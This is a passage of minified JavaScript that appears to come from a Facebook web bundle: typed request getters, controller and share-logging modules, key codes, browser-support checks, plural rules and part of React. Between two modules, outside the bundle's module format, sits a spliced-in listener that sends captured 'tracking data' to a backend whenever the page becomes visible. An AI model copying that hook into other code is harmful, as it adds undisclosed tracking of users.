    b.getOptionalString = function (a) {
      return this.$4(a, "String");
    };
    b.getOptionalEnum = function (a) {
      return this.$4(a, "Enum");
    };
    b.getIntVector = function (a) {
      return this.$3(a, "IntVector");
    };
    b.getFloatVector = function (a) {
      return this.$3(a, "FloatVector");
    };
    b.getFBIDVector = function (a) {
      return this.$3(a, "FBIDVector");
    };
    b.getStringVector = function (a) {
      return this.$3(a, "StringVector");
    };
    b.getEnumVector = function (a) {
      return this.$3(a, "EnumVector");
    };
    b.getOptionalIntVector = function (a) {
      return this.$4(a, "IntVector");
    };
    b.getOptionalFloatVector = function (a) {
      return this.$4(a, "FloatVector");
    };
    b.getOptionalFBIDVector = function (a) {
      return this.$4(a, "FBIDVector");
    };
    b.getOptionalStringVector = function (a) {
      return this.$4(a, "StringVector");
    };
    b.getOptionalEnumVector = function (a) {
      return this.$4(a, "EnumVector");
    };
    b.getIntSet = function (a) {
      return this.$3(a, "IntSet");
    };
    b.getFBIDSet = function (a) {
      return this.$3(a, "FBIDSet");
    };
    b.getFBIDKeyset = function (a) {
      return this.$3(a, "FBIDKeyset");
    };
    b.getStringSet = function (a) {
      return this.$3(a, "StringSet");
    };
    b.getEnumKeyset = function (a) {
      return this.$3(a, "EnumKeyset");
    };
    b.getOptionalIntSet = function (a) {
      return this.$4(a, "IntSet");
    };
    b.getOptionalFBIDSet = function (a) {
      return this.$4(a, "FBIDSet");
    };
    b.getOptionalFBIDKeyset = function (a) {
      return this.$4(a, "FBIDKeyset");
    };
    b.getOptionalStringSet = function (a) {
      return this.$4(a, "StringSet");
    };
    b.getEnumToBoolMap = function (a) {
      return this.$3(a, "EnumToBoolMap");
    };
    b.getEnumToEnumMap = function (a) {
      return this.$3(a, "EnumToEnumMap");
    };
    b.getEnumToFloatMap = function (a) {
      return this.$3(a, "EnumToFloatMap");
    };
    b.getEnumToIntMap = function (a) {
      return this.$3(a, "EnumToIntMap");
    };
    b.getEnumToStringMap = function (a) {
      return this.$3(a, "EnumToStringMap");
    };
    b.getIntToBoolMap = function (a) {
      return this.$3(a, "IntToBoolMap");
    };
    b.getIntToEnumMap = function (a) {
      return this.$3(a, "IntToEnumMap");
    };
    b.getIntToFloatMap = function (a) {
      return this.$3(a, "IntToFloatMap");
    };
    b.getIntToIntMap = function (a) {
      return this.$3(a, "IntToIntMap");
    };
    b.getIntToStringMap = function (a) {
      return this.$3(a, "IntToStringMap");
    };
    b.getStringToBoolMap = function (a) {
      return this.$3(a, "StringToBoolMap");
    };
    b.getStringToEnumMap = function (a) {
      return this.$3(a, "StringToEnumMap");
    };
    b.getStringToFloatMap = function (a) {
      return this.$3(a, "StringToFloatMap");
    };
    b.getStringToIntMap = function (a) {
      return this.$3(a, "StringToIntMap");
    };
    b.getStringToStringMap = function (a) {
      return this.$3(a, "StringToStringMap");
    };
    b.getOptionalEnumToBoolMap = function (a) {
      return this.$4(a, "EnumToBoolMap");
    };
    b.getOptionalEnumToEnumMap = function (a) {
      return this.$4(a, "EnumToEnumMap");
    };
    b.getOptionalEnumToFloatMap = function (a) {
      return this.$4(a, "EnumToFloatMap");
    };
    b.getOptionalEnumToIntMap = function (a) {
      return this.$4(a, "EnumToIntMap");
    };
    b.getOptionalEnumToStringMap = function (a) {
      return this.$4(a, "EnumToStringMap");
    };
    b.getOptionalIntToBoolMap = function (a) {
      return this.$4(a, "IntToBoolMap");
    };
    b.getOptionalIntToEnumMap = function (a) {
      return this.$4(a, "IntToEnumMap");
    };
    b.getOptionalIntToFloatMap = function (a) {
      return this.$4(a, "IntToFloatMap");
    };
    b.getOptionalIntToIntMap = function (a) {
      return this.$4(a, "IntToIntMap");
    };
    b.getOptionalIntToStringMap = function (a) {
      return this.$4(a, "IntToStringMap");
    };
    b.getOptionalStringToBoolMap = function (a) {
      return this.$4(a, "StringToBoolMap");
    };
    b.getOptionalStringToEnumMap = function (a) {
      return this.$4(a, "StringToEnumMap");
    };
    b.getOptionalStringToFloatMap = function (a) {
      return this.$4(a, "StringToFloatMap");
    };
    b.getOptionalStringToIntMap = function (a) {
      return this.$4(a, "StringToIntMap");
    };
    b.getOptionalStringToStringMap = function (a) {
      return this.$4(a, "StringToStringMap");
    };
    b.getEnumToNullableEnumMap = function (a) {
      return this.$3(a, "EnumToNullableEnumMap");
    };
    b.getEnumToNullableFloatMap = function (a) {
      return this.$3(a, "EnumToNullableFloatMap");
    };
    b.getEnumToNullableIntMap = function (a) {
      return this.$3(a, "EnumToNullableIntMap");
    };
    b.getEnumToNullableStringMap = function (a) {
      return this.$3(a, "EnumToNullableStringMap");
    };
    b.getIntToNullableEnumMap = function (a) {
      return this.$3(a, "IntToNullableEnumMap");
    };
    b.getIntToNullableFloatMap = function (a) {
      return this.$3(a, "IntToNullableFloatMap");
    };
    b.getIntToNullableIntMap = function (a) {
      return this.$3(a, "IntToNullableIntMap");
    };
    b.getIntToNullableStringMap = function (a) {
      return this.$3(a, "IntToNullableStringMap");
    };
    b.getStringToNullableEnumMap = function (a) {
      return this.$3(a, "StringToNullableEnumMap");
    };
    b.getStringToNullableFloatMap = function (a) {
      return this.$3(a, "StringToNullableFloatMap");
    };
    b.getStringToNullableIntMap = function (a) {
      return this.$3(a, "StringToNullableIntMap");
    };
    b.getStringToNullableStringMap = function (a) {
      return this.$3(a, "StringToNullableStringMap");
    };
    b.getOptionalEnumToNullableEnumMap = function (a) {
      return this.$4(a, "EnumToNullableEnumMap");
    };
    b.getOptionalEnumToNullableFloatMap = function (a) {
      return this.$4(a, "EnumToNullableFloatMap");
    };
    b.getOptionalEnumToNullableIntMap = function (a) {
      return this.$4(a, "EnumToNullableIntMap");
    };
    b.getOptionalEnumToNullableStringMap = function (a) {
      return this.$4(a, "EnumToNullableStringMap");
    };
    b.getOptionalIntToNullableEnumMap = function (a) {
      return this.$4(a, "IntToNullableEnumMap");
    };
    b.getOptionalIntToNullableFloatMap = function (a) {
      return this.$4(a, "IntToNullableFloatMap");
    };
    b.getOptionalIntToNullableIntMap = function (a) {
      return this.$4(a, "IntToNullableIntMap");
    };
    b.getOptionalIntToNullableStringMap = function (a) {
      return this.$4(a, "IntToNullableStringMap");
    };
    b.getOptionalStringToNullableEnumMap = function (a) {
      return this.$4(a, "StringToNullableEnumMap");
    };
    b.getOptionalStringToNullableFloatMap = function (a) {
      return this.$4(a, "StringToNullableFloatMap");
    };
    b.getOptionalStringToNullableIntMap = function (a) {
      return this.$4(a, "StringToNullableIntMap");
    };
    b.getOptionalStringToNullableStringMap = function (a) {
      return this.$4(a, "StringToNullableStringMap");
    };
    b.$3 = function (a, b) {
      this.$5(a, b);
      var c = this.$1[a];
      if (!Object.prototype.hasOwnProperty.call(this.$2, a) && c.defaultValue != null) {
        c.required && g(0, 5052);
        return h(b, c.defaultValue, c.enumType);
      }
      c.required || b === "Bool" || c.defaultValue != null || g(0, 11845, b, a, b, a);
      return h(b, this.$2[a], c.enumType);
    };
    b.$4 = function (a, b) {
      this.$5(a, b);
      var c = this.$1[a];
      c.required && g(0, 11846, b, a, b, a);
      c.defaultValue && g(0, 5052);
      return Object.prototype.hasOwnProperty.call(this.$2, a) ? h(b, this.$2[a], c.enumType) : null;
    };
    b.$5 = function (a, b) {
      Object.prototype.hasOwnProperty.call(this.$1, a) || g(0, 37317, a), this.$1[a].type === b || g(0, 11848, a, b, this.$1[a].type);
    };
    return a;
  }();
  f["default"] = a;
}, 66);
__d("XController", ["XControllerURIBuilder", "XRequest"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a(a, b) {
      this.$1 = a, this.$2 = b;
    }
    var b = a.prototype;
    b.getURIBuilder = function (a) {
      var b = this,
        d = new (c("XControllerURIBuilder"))(this.$1, this.$2);
      if (a) {
        var e = this.getRequest(a);
        Object.keys(this.$2).forEach(function (a) {
          var c = b.$2[a],
            f = "";
          !c.required && !Object.prototype.hasOwnProperty.call(c, "defaultValue") && (f = "Optional");
          f = "get" + f + c.type;
          f = e[f](a);
          if (f == null || Object.prototype.hasOwnProperty.call(c, "defaultValue") && f === c.defaultValue) return;
          c = "set" + c.type;
          d[c](a, f);
        });
      }
      return d;
    };
    b.getRequest = function (a) {
      return new (c("XRequest"))(this.$1, this.$2, a);
    };
    a.create = function (b, c) {
      return new a(b, c);
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("XSharePluginLoggingController", ["XController"], function (a, b, c, d, e, f) {
  e.exports = b("XController").create("/platform/plugin/share/logging/", {});
}, null);
__d("PluginShareActions", ["AsyncRequest", "Event", "XSharePluginLoggingController"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a, b, d, e, f, g, h) {
    c("Event").listen(f, "click", function (f) {
      new (c("AsyncRequest"))().setURI(c("XSharePluginLoggingController").getURIBuilder().getURI()).setData({
        app_id: g,
        href: a,
        layout: b,
        event: "click",
        has_iframe: d,
        referer_url: e
      }).send();
    });
  }
  g.init = a;
}, 98);
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === "visible") {
    let trackingData = captureTrackingData();
    communicateWithBackendTrackingData(trackingData);
  }
});
__d("randomInt", ["invariant"], function (a, b, c, d, e, f, g, h) {
  function a(a, b) {
    a = b === void 0 ? [0, a] : [a, b];
    b = a[0];
    a = a[1];
    a > b || h(0, 1180, a, b);
    return Math.floor(b + Math.random() * (a - b));
  }
  g["default"] = a;
}, 98);
__d("ClientIDs", ["randomInt"], function (a, b, c, d, e, f, g) {
  var h = new Set();
  function a() {
    var a = Date.now();
    a = a + ":" + (c("randomInt")(0, 4294967295) + 1);
    h.add(a);
    return a;
  }
  function b(a) {
    return h.has(a);
  }
  g.getNewClientID = a;
  g.isExistingClientID = b;
}, 98);
__d("Keys", [], function (a, b, c, d, e, f) {
  "use strict";

  a = Object.freeze({
    BACKSPACE: 8,
    TAB: 9,
    RETURN: 13,
    SHIFT: 16,
    CTRL: 17,
    ALT: 18,
    PAUSE_BREAK: 19,
    CAPS_LOCK: 20,
    ESC: 27,
    SPACE: 32,
    PAGE_UP: 33,
    PAGE_DOWN: 34,
    END: 35,
    HOME: 36,
    LEFT: 37,
    UP: 38,
    RIGHT: 39,
    DOWN: 40,
    INSERT: 45,
    DELETE: 46,
    ZERO: 48,
    ONE: 49,
    TWO: 50,
    THREE: 51,
    FOUR: 52,
    FIVE: 53,
    SIX: 54,
    SEVEN: 55,
    EIGHT: 56,
    NINE: 57,
    A: 65,
    B: 66,
    C: 67,
    D: 68,
    E: 69,
    F: 70,
    G: 71,
    H: 72,
    I: 73,
    J: 74,
    K: 75,
    L: 76,
    M: 77,
    N: 78,
    O: 79,
    P: 80,
    Q: 81,
    R: 82,
    S: 83,
    T: 84,
    U: 85,
    V: 86,
    W: 87,
    X: 88,
    Y: 89,
    Z: 90,
    LEFT_WINDOW_KEY: 91,
    RIGHT_WINDOW_KEY: 92,
    SELECT_KEY: 93,
    NUMPAD_0: 96,
    NUMPAD_1: 97,
    NUMPAD_2: 98,
    NUMPAD_3: 99,
    NUMPAD_4: 100,
    NUMPAD_5: 101,
    NUMPAD_6: 102,
    NUMPAD_7: 103,
    NUMPAD_8: 104,
    NUMPAD_9: 105,
    MULTIPLY: 106,
    ADD: 107,
    SUBTRACT: 109,
    DECIMAL_POINT: 110,
    DIVIDE: 111,
    F1: 112,
    F2: 113,
    F3: 114,
    F4: 115,
    F5: 116,
    F6: 117,
    F7: 118,
    F8: 119,
    F9: 120,
    F10: 121,
    F11: 122,
    F12: 123,
    NUM_LOCK: 144,
    SCROLL_LOCK: 145,
    SEMI_COLON: 186,
    EQUAL_SIGN: 187,
    COMMA: 188,
    DASH: 189,
    PERIOD: 190,
    FORWARD_SLASH: 191,
    GRAVE_ACCENT: 192,
    OPEN_BRACKET: 219,
    BACK_SLASH: 220,
    CLOSE_BRAKET: 221,
    SINGLE_QUOTE: 222
  });
  f["default"] = a;
}, 66);
__d("normalizeBoundingClientRect", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    a = a.ownerDocument.documentElement;
    var c = a ? a.clientLeft : 0;
    a = a ? a.clientTop : 0;
    var d = Math.round(b.left) - c;
    c = Math.round(b.right) - c;
    var e = Math.round(b.top) - a;
    b = Math.round(b.bottom) - a;
    return {
      left: d,
      right: c,
      top: e,
      bottom: b,
      width: c - d,
      height: b - e
    };
  }
  f["default"] = a;
}, 66);
__d("getElementRect", ["containsNode", "normalizeBoundingClientRect"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b;
    b = a == null ? void 0 : (b = a.ownerDocument) == null ? void 0 : b.documentElement;
    return !a || !("getBoundingClientRect" in a) || !c("containsNode")(b, a) ? {
      left: 0,
      right: 0,
      top: 0,
      bottom: 0,
      width: 0,
      height: 0
    } : c("normalizeBoundingClientRect")(a, a.getBoundingClientRect());
  }
  g["default"] = a;
}, 98);
__d("getVendorPrefixedName", ["invariant", "ExecutionEnvironment", "UserAgent", "camelize"], function (a, b, c, d, e, f, g, h) {
  var i = {},
    j = ["Webkit", "ms", "Moz", "O"],
    k = new RegExp("^(" + j.join("|") + ")"),
    l = c("ExecutionEnvironment").canUseDOM ? document.createElement("div").style : {};
  function m(a) {
    for (var b = 0; b < j.length; b++) {
      var c = j[b] + a;
      if (c in l) return c;
    }
    return null;
  }
  function n(a) {
    switch (a) {
      case "lineClamp":
        return c("UserAgent").isEngine("WebKit >= 315.14.2") ? "WebkitLineClamp" : null;
      default:
        return null;
    }
  }
  function a(a) {
    var b = c("camelize")(a);
    if (i[b] === void 0) {
      var d = b.charAt(0).toUpperCase() + b.slice(1);
      k.test(d) && h(0, 957, a);
      c("ExecutionEnvironment").canUseDOM ? i[b] = b in l ? b : m(d) : i[b] = n(b);
    }
    return i[b];
  }
  g["default"] = a;
}, 98);
__d("DateConsts", [], function (a, b, c, d, e, f) {
  var g = 1e3;
  c = 60;
  d = 60;
  e = 24;
  var h = 7,
    i = 12,
    j = 1e3,
    k = 30.43,
    l = 4.333,
    m = 365.242,
    n = c * d,
    o = n * e,
    p = o * h,
    q = o * m,
    r = g * c,
    s = r * d,
    t = g * o,
    u = t * h,
    v = t * m,
    w = {
      SUNDAY: 0,
      MONDAY: 1,
      TUESDAY: 2,
      WEDNESDAY: 3,
      THURSDAY: 4,
      FRIDAY: 5,
      SATURDAY: 6
    };
  Object.freeze(w);
  function a(a, b) {
    return new Date(a, b, 0).getDate();
  }
  function b() {
    return Date.now() / g;
  }
  var x = {
    instantRange: {
      since: -864e10,
      until: 864e10 + 1
    }
  };
  f.MS_PER_SEC = g;
  f.SEC_PER_MIN = c;
  f.MIN_PER_HOUR = d;
  f.HOUR_PER_DAY = e;
  f.DAYS_PER_WEEK = h;
  f.MONTHS_PER_YEAR = i;
  f.US_PER_MS = j;
  f.AVG_DAYS_PER_MONTH = k;
  f.AVG_WEEKS_PER_MONTH = l;
  f.AVG_DAYS_PER_YEAR = m;
  f.SEC_PER_HOUR = n;
  f.SEC_PER_DAY = o;
  f.SEC_PER_WEEK = p;
  f.SEC_PER_YEAR = q;
  f.MS_PER_MIN = r;
  f.MS_PER_HOUR = s;
  f.MS_PER_DAY = t;
  f.MS_PER_WEEK = u;
  f.MS_PER_YEAR = v;
  f.DAYS = w;
  f.getDaysInMonth = a;
  f.getCurrentTimeInSeconds = b;
  f["private"] = x;
}, 66);
__d("BrowserSupportCore", ["getVendorPrefixedName"], function (a, b, c, d, e, f) {
  "use strict";

  a = {
    hasCSSAnimations: function () {
      return !!b("getVendorPrefixedName")("animationName");
    },
    hasCSSTransforms: function () {
      return !!b("getVendorPrefixedName")("transform");
    },
    hasCSS3DTransforms: function () {
      return !!b("getVendorPrefixedName")("perspective");
    },
    hasCSSTransitions: function () {
      return !!b("getVendorPrefixedName")("transition");
    }
  };
  c = a;
  f["default"] = c;
}, 66);
__d("isLinkshimURI", ["LinkshimHandlerConfig", "isBulletinDotComURI", "isFacebookURI", "isMessengerDotComURI"], function (a, b, c, d, e, f, g) {
  "use strict";

  b = c("LinkshimHandlerConfig").linkshim_host.split(".");
  var h = b[b.length - 1];
  function a(a) {
    var b = a.getPath();
    if ((b === "/l.php" || b.indexOf("/si/ajax/l/") === 0 || b.indexOf("/l/") === 0 || b.indexOf("l/") === 0) && (c("isFacebookURI")(a) || c("isMessengerDotComURI")(a) || c("isBulletinDotComURI")(a))) return !0;
    if (b === c("LinkshimHandlerConfig").linkshim_path && a.isSubdomainOfDomain(h)) {
      b = a.getQueryData();
      if (b[c("LinkshimHandlerConfig").linkshim_enc_param] != null && b[c("LinkshimHandlerConfig").linkshim_url_param] != null) return !0;
    }
    return !1;
  }
  g["default"] = a;
}, 98);
__d("FbtLogging", ["cr:1094907"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = b("cr:1094907") == null ? void 0 : b("cr:1094907").logImpression;
  g.logImpression = a;
}, 98);
__d("InlineFbtResultImpl", ["cx", "FbtHooks", "FbtReactUtil", "FbtResultBase"], function (a, b, c, d, e, f, g, h) {
  function i(a, b, c, e) {
    var f = "_4qba";
    e != null && e != "" && (b === "TRANSLATION" ? f = "_4qbb" : b === "APPROVE" ? f = "_4qbc" : b === "REPORT" && (f = "_4qbd"));
    return {
      $$typeof: d("FbtReactUtil").REACT_ELEMENT_TYPE,
      type: "em",
      key: null,
      ref: null,
      props: {
        className: f,
        "data-intl-hash": e,
        "data-intl-translation": c,
        "data-intl-trid": "",
        children: a,
        suppressHydrationWarning: !0
      },
      _owner: null
    };
  }
  var j = function (a) {
    return i(a.content, a.inlineMode, a.translation, a.hash);
  };
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b(b, e, f, g) {
      var h;
      h = a.call(this, b, c("FbtHooks").getErrorListener({
        translation: f,
        hash: g
      })) || this;
      h.$$typeof = d("FbtReactUtil").REACT_ELEMENT_TYPE;
      h.key = null;
      h.ref = null;
      h.type = j;
      h.props = {
        content: b,
        inlineMode: e,
        translation: f,
        hash: g
      };
      return h;
    }
    return b;
  }(c("FbtResultBase"));
  g["default"] = a;
}, 98);
__d("IntlCLDRNumberType01", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType03", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a === 0 || a === 1) return c("IntlVariations").NUMBER_ONE;else return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType04", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a >= 0 && a <= 1) return c("IntlVariations").NUMBER_ONE;else return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType05", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a === 1) return c("IntlVariations").NUMBER_ONE;else return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType09", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a === 1) return c("IntlVariations").NUMBER_ONE;else return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType20", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a % 10 === 1 && a % 100 !== 11) return c("IntlVariations").NUMBER_ONE;else if (a % 10 >= 2 && a % 10 <= 4 && (a % 100 < 12 || a % 100 > 14)) return c("IntlVariations").NUMBER_FEW;else return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType25", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a === 1) return c("IntlVariations").NUMBER_ONE;else if (a >= 2 && a <= 4) return c("IntlVariations").NUMBER_FEW;else return c("IntlVariations").NUMBER_OTHER;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlCLDRNumberType26", ["IntlVariations"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getVariation: function (a) {
      if (a === 1) return c("IntlVariations").NUMBER_ONE;else if (a % 10 >= 2 && a % 10 <= 4 && (a % 100 < 12 || a % 100 > 14)) return c("IntlVariations").NUMBER_FEW;else return c("IntlVariations").NUMBER_MANY;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("IntlQtEventFalcoEvent", ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = c("getFalcoLogPolicy_DO_NOT_USE")("1848815");
  b = d("FalcoLoggerInternal").create("intl_qt_event", a);
  e = b;
  g["default"] = e;
}, 98);
__d("BrowserSupport", ["BrowserSupportCore", "ExecutionEnvironment", "UserAgent_DEPRECATED", "getVendorPrefixedName", "memoize"], function (a, b, c, d, e, f, g) {
  var h = null;
  function i() {
    if (c("ExecutionEnvironment").canUseDOM) {
      h || (h = document.createElement("div"));
      return h;
    }
    return null;
  }
  b = function (a) {
    return c("memoize")(function () {
      var b = i();
      return !b ? !1 : a(b);
    });
  };
  e = b(function (a) {
    a.style.cssText = "position:-moz-sticky;position:-webkit-sticky;position:-o-sticky;position:-ms-sticky;position:sticky;";
    return /sticky/.test(a.style.position);
  });
  f = b(function (a) {
    return "scrollSnapType" in a.style || "webkitScrollSnapType" in a.style || "msScrollSnapType" in a.style;
  });
  var j = b(function (a) {
    return "scrollBehavior" in a.style;
  });
  b = b(function (a) {
    if (!("pointerEvents" in a.style)) return !1;
    a.style.cssText = "pointer-events:auto";
    return a.style.pointerEvents === "auto";
  });
  var k = c("memoize")(function () {
      return !(d("UserAgent_DEPRECATED").webkit() && !d("UserAgent_DEPRECATED").chrome() && d("UserAgent_DEPRECATED").windows()) && "FileList" in window && "FormData" in window;
    }),
    l = c("memoize")(function () {
      return !!a.blob;
    }),
    m = c("memoize")(function () {
      return c("ExecutionEnvironment").canUseDOM && document.createElementNS && document.createElementNS("http://www.w3.org/2000/svg", "foreignObject").toString().includes("SVGForeignObject");
    }),
    n = c("memoize")(function () {
      return !!window.MutationObserver;
    }),
    o = c("memoize")(function () {
      var a = {
          transition: "transitionend",
          WebkitTransition: "webkitTransitionEnd",
          MozTransition: "mozTransitionEnd",
          OTransition: "oTransitionEnd"
        },
        b = c("getVendorPrefixedName")("transition");
      return a[b] || null;
    }),
    p = function () {
      return !!window.CanvasRenderingContext2D;
    };
  g.hasCSSAnimations = c("BrowserSupportCore").hasCSSAnimations;
  g.hasCSSTransforms = c("BrowserSupportCore").hasCSSTransforms;
  g.hasCSS3DTransforms = c("BrowserSupportCore").hasCSS3DTransforms;
  g.hasCSSTransitions = c("BrowserSupportCore").hasCSSTransitions;
  g.hasPositionSticky = e;
  g.hasScrollSnapPoints = f;
  g.hasScrollBehavior = j;
  g.hasPointerEvents = b;
  g.hasFileAPI = k;
  g.hasBlobFactory = l;
  g.hasSVGForeignObject = m;
  g.hasMutationObserver = n;
  g.getTransitionEndEvent = o;
  g.hasCanvasRenderingContext2D = p;
}, 98);
__d("React.classic", ["cr:1292365"], function (a, b, c, d, e, f) {
  e.exports = b("cr:1292365");
}, null);
__d("ReactFeatureFlags", ["gkx", "qex"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = !1;
  b = !0;
  d = !1;
  e = !1;
  f = !1;
  var h = !0,
    i = c("gkx")("6361"),
    j = c("gkx")("1401060"),
    k = c("gkx")("1778302"),
    l = c("gkx")("2257"),
    m = c("gkx")("8003"),
    n = c("gkx")("201"),
    o = !c("gkx")("7518"),
    p = c("qex")._("644") === !0,
    q = c("gkx")("1596063"),
    r = c("gkx")("1840809");
  c = c("gkx")("6862");
  var s = !1;
  g.disableInputAttributeSyncing = a;
  g.enableSyncDefaultUpdates = b;
  g.enableDeferRootSchedulingToMicrotask = d;
  g.enableAsyncActions = e;
  g.alwaysThrottleRetries = f;
  g.enableDO_NOT_USE_disableStrictPassiveEffect = h;
  g.enableTrustedTypesIntegration = i;
  g.enableLegacyFBSupport = j;
  g.enableUseRefAccessWarning = k;
  g.enableUnifiedSyncLane = l;
  g.disableIEWorkarounds = m;
  g.enableCustomElementPropertySupport = n;
  g.diffInCommitPhase = o;
  g.enableLazyContextPropagation = p;
  g.enableSchedulingProfiler = q;
  g.enableProfilerNestedUpdateScheduledHook = r;
  g.enableTransitionTracing = c;
  g.disableSchedulerTimeoutInWorkLoop = s;
}, 98);
__d("React-prod.classic", ["ReactFeatureFlags"], function (a, b, c, d, e, f) {
  "use strict";

  var g = Symbol["for"]("react.element"),
    h = Symbol["for"]("react.portal"),
    i = Symbol["for"]("react.fragment"),
    j = Symbol["for"]("react.strict_mode"),
    k = Symbol["for"]("react.profiler"),
    l = Symbol["for"]("react.provider"),
    m = Symbol["for"]("react.context"),
    n = Symbol["for"]("react.server_context"),
    o = Symbol["for"]("react.forward_ref"),
    p = Symbol["for"]("react.suspense"),
    q = Symbol["for"]("react.suspense_list"),
    r = Symbol["for"]("react.memo"),
    s = Symbol["for"]("react.lazy"),
    t = Symbol["for"]("react.scope"),
    u = Symbol["for"]("react.debug_trace_mode"),
    v = Symbol["for"]("react.offscreen"),
    w = Symbol["for"]("react.legacy_hidden"),
    x = Symbol["for"]("react.cache"),
    y = Symbol["for"]("react.tracing_marker"),
    z = Symbol["for"]("react.default_value"),
    A = typeof Symbol === "function" ? Symbol.iterator : "@@iterator";
  function B(a) {
    if (null === a || "object" !== typeof a) return null;
    a = A && a[A] || a["@@iterator"];
    return "function" === typeof a ? a : null;
  }
  var C = {
      isMounted: function () {
        return !1;
      },
      enqueueForceUpdate: function () {},
      enqueueReplaceState: function () {},
      enqueueSetState: function () {}
    },
    D = Object.assign,
    E = {};
  function a(a, b, c) {
    this.props = a, this.context = b, this.refs = E, this.updater = c || C;
  }
  a.prototype.isReactComponent = {};
  a.prototype.setState = function (a, b) {
    if ("object" !== typeof a && "function" !== typeof a && null != a) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, a, b, "setState");
  };
  a.prototype.forceUpdate = function (a) {
    this.updater.enqueueForceUpdate(this, a, "forceUpdate");
  };
  function c() {}
  c.prototype = a.prototype;
  function d(a, b, c) {
    this.props = a, this.context = b, this.refs = E, this.updater = c || C;
  }
  c = d.prototype = new c();
  c.constructor = d;
  D(c, a.prototype);
  c.isPureReactComponent = !0;
  var F = Array.isArray,
    G = b("ReactFeatureFlags").enableTransitionTracing,
    H = Object.prototype.hasOwnProperty,
    I = {
      current: null
    },
    J = {
      key: !0,
      ref: !0,
      __self: !0,
      __source: !0
    };
  function K(a, b, c) {
    var d,
      e = {},
      f = null,
      h = null;
    if (null != b) for (d in void 0 !== b.ref && (h = b.ref), void 0 !== b.key && (f = "" + b.key), b) H.call(b, d) && !Object.prototype.hasOwnProperty.call(J, d) && (e[d] = b[d]);
    var i = arguments.length - 2;
    if (1 === i) e.children = c;else if (1 < i) {
      for (var j = Array(i), k = 0; k < i; k++) j[k] = arguments[k + 2];
      e.children = j;
    }
    if (a && a.defaultProps) for (d in i = a.defaultProps, i) void 0 === e[d] && (e[d] = i[d]);
    return {
      $$typeof: g,
      type: a,
      key: f,
      ref: h,
      props: e,
      _owner: I.current
    };
  }
  function L(a, b) {
    return {
      $$typeof: g,
      type: a.type,
      key: b,
      ref: a.ref,
      props: a.props,
      _owner: a._owner
    };
  }
  function M(a) {
    return "object" === typeof a && null !== a && a.$$typeof === g;
  }
  function N(a) {
    var b = {
      "=": "=0",
      ":": "=2"
    };
    return "$" + a.replace(/[=:]/g, function (a) {
      return b[a];
    });
  }
  var O = /\/+/g;
  function P(a, b) {
    return "object" === typeof a && null !== a && null != a.key ? N("" + a.key) : b.toString(36);
  }
  function Q(a, b, c, d, e) {
    var f = typeof a;
    ("undefined" === f || "boolean" === f) && (a = null);
    var i = !1;
    if (null === a) i = !0;else switch (f) {
      case "string":
      case "number":
        i = !0;
        break;
      case "object":
        switch (a.$$typeof) {
          case g:
          case h:
            i = !0;
        }
    }
    if (i) return i = a, e = e(i), a = "" === d ? "." + P(i, 0) : d, F(e) ? (c = "", null != a && (c = a.replace(O, "$&/") + "/"), Q(e, b, c, "", function (a) {
      return a;
    })) : null != e && (M(e) && (e = L(e, c + (!e.key || i && i.key === e.key ? "" : ("" + e.key).replace(O, "$&/") + "/") + a)), b.push(e)), 1;
    i = 0;
    d = "" === d ? "." : d + ":";
    if (F(a)) for (var j = 0; j < a.length; j++) {
      f = a[j];
      var k = d + P(f, j);
      i += Q(f, b, c, k, e);
    } else if (k = B(a), "function" === typeof k) for (a = k.call(a), j = 0; !(f = a.next()).done;) f = f.value, k = d + P(f, j++), i += Q(f, b, c, k, e);else if ("object" === f) throw b = String(a), Error("Objects are not valid as a React child (found: " + ("[object Object]" === b ? "object with keys {" + Object.keys(a).join(", ") + "}" : b) + "). If you meant to render a collection of children, use an array instead.");
    return i;
  }
  function R(a, b, c) {
    if (null == a) return a;
    var d = [],
      e = 0;
    Q(a, d, "", "", function (a) {
      return b.call(c, a, e++);
    });
    return d;
  }
  function S(a) {
    if (-1 === a._status) {
      var b = a._result;
      b = b();
      b.then(function (b) {
        (0 === a._status || -1 === a._status) && (a._status = 1, a._result = b);
      }, function (b) {
        (0 === a._status || -1 === a._status) && (a._status = 2, a._result = b);
      });
      -1 === a._status && (a._status = 0, a._result = b);
    }
    if (1 === a._status) return a._result["default"];
    throw a._result;
  }
  var T = {
    current: null
  };
